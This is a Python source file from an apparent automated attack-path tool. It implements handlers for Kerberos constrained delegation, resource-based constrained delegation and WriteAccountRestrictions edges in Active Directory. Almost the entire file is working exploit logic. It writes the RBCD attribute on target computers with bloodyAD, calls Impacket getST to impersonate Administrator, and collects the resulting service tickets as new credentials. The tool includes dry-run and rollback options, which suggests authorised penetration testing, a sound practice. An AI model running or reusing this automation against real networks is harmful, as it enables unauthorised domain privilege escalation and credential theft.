"""Kerberos delegation edge exploitation handlers.

Handles AllowedToDelegate (constrained delegation), AllowedToAct (RBCD),
and WriteAccountRestrictions (write msDS-AllowedToActOnBehalfOfOtherIdentity).
"""

from __future__ import annotations

from pathstrike.engine.edge_registry import register_handler
from pathstrike.handlers.base import BaseEdgeHandler
from pathstrike.models import (
    Credential,
    CredentialType,
    EdgeInfo,
    RollbackAction,
)
from pathstrike.tools import bloodyad_wrapper as bloody
from pathstrike.tools import impacket_wrapper as impacket


@register_handler("AllowedToDelegate")
class AllowedToDelegateHandler(BaseEdgeHandler):
    """Handles AllowedToDelegate (constrained delegation) edges.

    The source account is configured with ``msDS-AllowedToDelegateTo``
    pointing at a service on the target.  We use Impacket ``getST.py``
    to perform S4U2Proxy and obtain a service ticket impersonating a
    privileged user.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        # Constrained delegation requires that we have credentials for the
        # source account (the delegating account).
        principal = self._resolve_principal(edge)
        domain = self._get_domain()
        if not self.cred_store.get_best_credential(principal, domain):
            cfg = self.config.credentials
            if cfg.username.lower() != principal.lower():
                return False, (
                    f"No credential for delegating account {principal}; "
                    "cannot perform S4U2Proxy"
                )
        return True, f"Constrained delegation from {edge.source.name} to {edge.target.name} is exploitable"

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        principal = self._resolve_principal(edge)
        target = self._resolve_target(edge)
        target_fqdn = edge.target.name.split("@")[0]

        # Determine the SPN to request (use cifs/ by default for most lateral movement)
        spn = edge.properties.get("spn") or f"cifs/{target_fqdn}"
        impersonate_user = "Administrator"  # Default high-value target

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would perform S4U2Proxy as {principal} "
                f"for {impersonate_user} to {spn}",
                [],
            )

        self.logger.info(
            "Performing S4U2Proxy: %s -> %s (impersonating %s)",
            principal, spn, impersonate_user,
        )

        _target_str, auth_flags = self._get_impacket_auth(principal)
        domain = self._get_domain()
        dc_ip = self._get_dc_host()

        # Determine password/hash for target string
        cred = self.cred_store.get_best_credential(principal, domain)
        password = None
        nt_hash = None
        if cred:
            if cred.cred_type == CredentialType.password:
                password = cred.value
            elif cred.cred_type == CredentialType.nt_hash:
                nt_hash = cred.value
        else:
            password = self.config.credentials.password
            nt_hash = self.config.credentials.nt_hash

        result = await impacket.get_st(
            spn=spn,
            impersonate=impersonate_user,
            auth_args=auth_flags,
            domain=domain,
            username=principal,
            password=password,
            nt_hash=nt_hash,
            dc_ip=dc_ip,
        )

        if not result["success"]:
            return (
                False,
                f"S4U2Proxy failed: {result.get('error', 'unknown')}",
                [],
            )

        # getST.py writes a .ccache file to CWD
        ccache_file = f"{impersonate_user}@{spn.replace('/', '_')}.ccache"
        new_creds = [
            Credential(
                cred_type=CredentialType.ccache,
                value=ccache_file,
                username=impersonate_user,
                domain=domain,
                obtained_from=f"S4U2Proxy via constrained delegation ({principal} -> {spn})",
            )
        ]

        return (
            True,
            f"Obtained service ticket for {impersonate_user} to {spn}",
            new_creds,
        )

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        # No AD changes were made; we only requested a ticket.
        return None


@register_handler("AllowedToAct")
class AllowedToActHandler(BaseEdgeHandler):
    """Handles AllowedToAct (Resource-Based Constrained Delegation) edges.

    The target's ``msDS-AllowedToActOnBehalfOfOtherIdentity`` already
    includes the source account.  We use Impacket ``getST.py`` to perform
    S4U2Self + S4U2Proxy and obtain a service ticket.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        principal = self._resolve_principal(edge)
        domain = self._get_domain()
        if not self.cred_store.get_best_credential(principal, domain):
            cfg = self.config.credentials
            if cfg.username.lower() != principal.lower():
                return False, (
                    f"No credential for RBCD source account {principal}"
                )
        return True, f"RBCD from {edge.source.name} to {edge.target.name} is exploitable"

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        principal = self._resolve_principal(edge)
        target = self._resolve_target(edge)
        target_fqdn = edge.target.name.split("@")[0]
        spn = f"cifs/{target_fqdn}"
        impersonate_user = "Administrator"

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would perform RBCD S4U as {principal} "
                f"for {impersonate_user} to {spn}",
                [],
            )

        self.logger.info(
            "Performing RBCD S4U2Self+S4U2Proxy: %s -> %s (impersonating %s)",
            principal, spn, impersonate_user,
        )

        _target_str, auth_flags = self._get_impacket_auth(principal)
        domain = self._get_domain()
        dc_ip = self._get_dc_host()

        cred = self.cred_store.get_best_credential(principal, domain)
        password = None
        nt_hash = None
        if cred:
            if cred.cred_type == CredentialType.password:
                password = cred.value
            elif cred.cred_type == CredentialType.nt_hash:
                nt_hash = cred.value
        else:
            password = self.config.credentials.password
            nt_hash = self.config.credentials.nt_hash

        result = await impacket.get_st(
            spn=spn,
            impersonate=impersonate_user,
            auth_args=auth_flags,
            domain=domain,
            username=principal,
            password=password,
            nt_hash=nt_hash,
            dc_ip=dc_ip,
        )

        if not result["success"]:
            return False, f"RBCD S4U failed: {result.get('error', 'unknown')}", []

        ccache_file = f"{impersonate_user}@{spn.replace('/', '_')}.ccache"
        new_creds = [
            Credential(
                cred_type=CredentialType.ccache,
                value=ccache_file,
                username=impersonate_user,
                domain=domain,
                obtained_from=f"RBCD S4U ({principal} -> {spn})",
            )
        ]
        return (
            True,
            f"Obtained service ticket for {impersonate_user} to {spn} via RBCD",
            new_creds,
        )

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        # RBCD configuration already existed; we only used it.
        return None


@register_handler("WriteAccountRestrictions")
class WriteAccountRestrictionsHandler(BaseEdgeHandler):
    """Handles WriteAccountRestrictions edges.

    The principal can write ``msDS-AllowedToActOnBehalfOfOtherIdentity``
    on the target, enabling a full RBCD attack:

    1. Add a controlled machine account (or use an existing one) via bloodyAD.
    2. Set RBCD on the target pointing to the machine account.
    3. Use Impacket ``getST.py`` for S4U2Self + S4U2Proxy.

    Rollback removes the RBCD attribute from the target.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        if edge.target.label.lower() != "computer":
            return False, (
                f"WriteAccountRestrictions targets a Computer, got {edge.target.label}"
            )
        return True, f"Can write RBCD attribute on {edge.target.name}"

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        principal = self._resolve_principal(edge)
        target = self._resolve_target(edge)
        target_fqdn = edge.target.name.split("@")[0]
        auth_args = self._get_auth_args(principal)
        domain = self._get_domain()
        dc_ip = self._get_dc_host()

        # Use the current principal as the machine account for RBCD.
        # In a real scenario you might create a new machine account first.
        machine_account = principal

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would set RBCD on {target} for {machine_account}, "
                f"then S4U to obtain service ticket",
                [],
            )

        # Step 1: Set RBCD on target
        self.logger.info("Setting RBCD on %s for %s", target, machine_account)
        rbcd_result = await bloody.set_rbcd(
            self.config, auth_args, target, machine_account
        )
        if not rbcd_result["success"]:
            return (
                False,
                f"Failed to set RBCD on {target}: {rbcd_result.get('error', 'unknown')}",
                [],
            )

        # Step 2: S4U2Self + S4U2Proxy via Impacket
        spn = f"cifs/{target_fqdn}"
        impersonate_user = "Administrator"

        self.logger.info(
            "Performing S4U2Self+S4U2Proxy: %s -> %s (impersonating %s)",
            machine_account, spn, impersonate_user,
        )

        _target_str, impacket_auth = self._get_impacket_auth(principal)

        cred = self.cred_store.get_best_credential(principal, domain)
        password = None
        nt_hash = None
        if cred:
            if cred.cred_type == CredentialType.password:
                password = cred.value
            elif cred.cred_type == CredentialType.nt_hash:
                nt_hash = cred.value
        else:
            password = self.config.credentials.password
            nt_hash = self.config.credentials.nt_hash

        st_result = await impacket.get_st(
            spn=spn,
            impersonate=impersonate_user,
            auth_args=impacket_auth,
            domain=domain,
            username=machine_account,
            password=password,
            nt_hash=nt_hash,
            dc_ip=dc_ip,
        )

        if not st_result["success"]:
            return (
                False,
                f"RBCD set on {target} but S4U failed: {st_result.get('error', 'unknown')}",
                [],
            )

        ccache_file = f"{impersonate_user}@{spn.replace('/', '_')}.ccache"
        new_creds = [
            Credential(
                cred_type=CredentialType.ccache,
                value=ccache_file,
                username=impersonate_user,
                domain=domain,
                obtained_from=f"RBCD via WriteAccountRestrictions ({machine_account} -> {target})",
            )
        ]

        return (
            True,
            f"RBCD attack complete on {target}: obtained ticket for {impersonate_user}",
            new_creds,
        )

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        principal = self._resolve_principal(edge)
        target = self._resolve_target(edge)
        return RollbackAction(
            step_index=0,
            action_type="remove_rbcd",
            description=f"Remove RBCD attribute from {target} (machine: {principal})",
            command=f"bloodyAD remove rbcd {target} {principal}",
            reversible=True,
        )
